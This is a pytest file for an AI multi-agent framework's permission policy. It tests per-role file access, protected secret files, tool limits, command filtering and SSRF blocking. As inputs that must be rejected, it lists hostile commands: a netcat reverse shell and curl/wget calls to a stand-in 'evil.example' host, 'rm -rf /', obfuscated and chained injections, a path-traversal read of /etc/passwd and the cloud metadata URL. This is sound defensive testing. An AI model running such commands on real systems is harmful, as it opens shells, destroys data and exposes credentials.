"""Permission policy tests: boundaries per agent, traversal, protected files, free mode."""

from __future__ import annotations

from pathlib import Path

import pytest

from agency.permissions.policy import PermissionPolicy

from .conftest import _TMP_ROOT  # type: ignore[attr-defined]


@pytest.fixture(scope="module")
def project_root() -> Path:
    root = Path(_TMP_ROOT) / "proj_perms"
    for sub in ["backend", "frontend", "tests", "deployment", "docs"]:
        (root / sub).mkdir(parents=True, exist_ok=True)
    return root


def test_backend_writes_backend_reads_all(project_root: Path) -> None:
    policy = PermissionPolicy(project_root=project_root)
    assert policy.check_path("backend_engineer", "backend/app.py", mode="write").allowed
    assert not policy.check_path("backend_engineer", "frontend/app.tsx", mode="write").allowed
    assert not policy.check_path("backend_engineer", "backend/.env", mode="write").allowed
    assert policy.check_path("backend_engineer", "frontend/app.tsx", mode="read").allowed


def test_frontend_writes_frontend_reads_all(project_root: Path) -> None:
    policy = PermissionPolicy(project_root=project_root)
    assert policy.check_path("frontend_engineer", "frontend/page.tsx", mode="write").allowed
    assert policy.check_path("frontend_engineer", "docs/design.md", mode="write").allowed
    assert not policy.check_path("frontend_engineer", "backend/app.py", mode="write").allowed
    assert policy.check_path("frontend_engineer", "backend/app.py", mode="read").allowed


def test_planner_reads_everything_writes_docs(project_root: Path) -> None:
    policy = PermissionPolicy(project_root=project_root)
    assert policy.check_path("planner", "backend/app.py", mode="read").allowed
    assert policy.check_path("planner", "docs/implementation_plan.md", mode="write").allowed
    assert not policy.check_path("planner", "backend/app.py", mode="write").allowed


def test_devops_writes_deployment_reads_all(project_root: Path) -> None:
    policy = PermissionPolicy(project_root=project_root)
    assert policy.check_path(
        "devops_engineer", "deployment/docker-compose.yml", mode="write"
    ).allowed
    assert not policy.check_path("devops_engineer", "backend/app.py", mode="write").allowed
    assert policy.check_path("devops_engineer", "backend/app.py", mode="read").allowed


def test_code_reviewer_writes_docs_reads_all(project_root: Path) -> None:
    policy = PermissionPolicy(project_root=project_root)
    assert policy.check_path("code_reviewer", "docs/code_review.md", mode="write").allowed
    assert policy.check_path("code_reviewer", "backend/app.py", mode="read").allowed
    assert not policy.check_path("code_reviewer", "backend/app.py", mode="write").allowed


def test_orchestrator_write_dirs_include_docs(project_root: Path) -> None:
    """The orchestrator passes concrete write_dirs that override the static
    policy, so the architecture-driven scope must include docs/ for the
    frontend agent (its design directive writes docs/design.md).
    """
    from agency.workflows.state import WorkflowState

    state = WorkflowState(architecture={"directories": {"frontend": "frontend"}})
    dirs = state.write_dirs_for("frontend_engineer")
    assert dirs is not None
    assert "docs" in dirs

    policy = PermissionPolicy(project_root=project_root, write_dirs=dirs)
    assert policy.check_path("frontend_engineer", "docs/design.md", mode="write").allowed


def test_free_mode_allows_any_write(project_root: Path) -> None:
    policy = PermissionPolicy(project_root=project_root, workspace_mode="free")
    assert policy.check_path("backend_engineer", "frontend/app.tsx", mode="write").allowed
    assert policy.check_path("planner", "backend/app.py", mode="write").allowed
    assert not policy.check_path("backend_engineer", "backend/.env", mode="write").allowed


def test_path_traversal_denied(project_root: Path) -> None:
    policy = PermissionPolicy(project_root=project_root)
    assert not policy.check_path("backend_engineer", "../../../etc/passwd", mode="write").allowed
    assert not policy.check_path("backend_engineer", "../outside.txt", mode="read").allowed


def test_unknown_agent_denied(project_root: Path) -> None:
    policy = PermissionPolicy(project_root=project_root)
    assert not policy.check_path("mystery_agent", "backend/x.py", mode="write").allowed


def test_tool_policy() -> None:
    policy = PermissionPolicy()
    assert policy.check_tool("planner", "filesystem").allowed
    assert policy.check_tool("planner", "web").allowed
    assert not policy.check_tool("backend_engineer", "web").allowed
    assert not policy.check_tool("backend_engineer", "deploy_tool").allowed
    assert policy.check_tool("code_reviewer", "web").allowed
    assert policy.check_tool("code_reviewer", "filesystem").allowed


def test_forbidden_command_rejected() -> None:
    policy = PermissionPolicy()
    assert not policy.check_command("devops_engineer", "rm -rf /").allowed
    assert policy.check_command("devops_engineer", "docker compose config -q").allowed


def test_forbidden_substring_rejected() -> None:
    policy = PermissionPolicy()
    assert not policy.check_command("devops_engineer", "cd /tmp && curl example.com").allowed
    assert not policy.check_command("devops_engineer", "echo hi; rm -rf /").allowed
    assert not policy.check_command("devops_engineer", "git push --force").allowed
    assert not policy.check_command("devops_engineer", "python -c 'print(1)'").allowed


def test_chaining_rejected() -> None:
    policy = PermissionPolicy()
    for command in [
        "ls; whoami",
        "a && b",
        "a || b",
        "cat x | grep y",
        "echo `whoami`",
        "echo $(whoami)",
        "echo ${HOME}",
        "touch a > out.txt",
        "sort < in.txt",
    ]:
        assert not policy.check_command("devops_engineer", command).allowed, command
    assert policy.check_command("devops_engineer", "uv run pytest -q").allowed


def test_control_characters_rejected() -> None:
    policy = PermissionPolicy()
    for command in [
        "git status\ncurl evil.example",
        "git status\rcurl evil.example",
        "echo hi\tevil",
        "git status\n\tcurl evil.example",
        "echo a\x1bevil",
    ]:
        assert not policy.check_command("devops_engineer", command).allowed, repr(command)


def test_program_allowlist_enforced() -> None:
    policy = PermissionPolicy()
    for command in [
        "curl http://evil.example",
        "wget http://evil.example",
        "nc -e /bin/sh evil.example 4444",
        "python -c 'print(1)'",
        "c\"ur\"l evil.example",
        "cu\\rl evil.example",
        "rm -rf /",
    ]:
        assert not policy.check_command("devops_engineer", command).allowed, command
    for command in [
        "git status",
        "docker compose config -q",
        "uv run pytest -q",
        "npm test",
        "python script.py",
    ]:
        assert policy.check_command("devops_engineer", command).allowed, command


def test_protected_file_never_readable(project_root: Path) -> None:
    policy = PermissionPolicy(project_root=project_root)
    for path in ["backend/.env", "backend/secrets.yaml", "frontend/.git-credentials"]:
        assert not policy.check_path("code_reviewer", path, mode="read").allowed, path
    assert policy.check_path("code_reviewer", "backend/app.py", mode="read").allowed


def test_ssrf_blocks_private_addresses() -> None:
    from agency.tools.web_search import _blocked_url_reason, _is_private_ip

    for ip in ["127.0.0.1", "127.0.0.53", "10.0.0.1", "172.16.5.4", "192.168.1.1",
               "169.254.169.254", "::1", "fc00::1", "0.0.0.0"]:
        assert _is_private_ip(ip), ip
    assert not _is_private_ip("8.8.8.8")
    assert not _is_private_ip("93.184.216.34")

    assert _blocked_url_reason("http://127.0.0.1:8000/api") is not None
    assert _blocked_url_reason("http://169.254.169.254/latest/meta-data") is not None
    assert _blocked_url_reason("http://localhost:3000") is not None
    assert _blocked_url_reason("http://example.com") is None
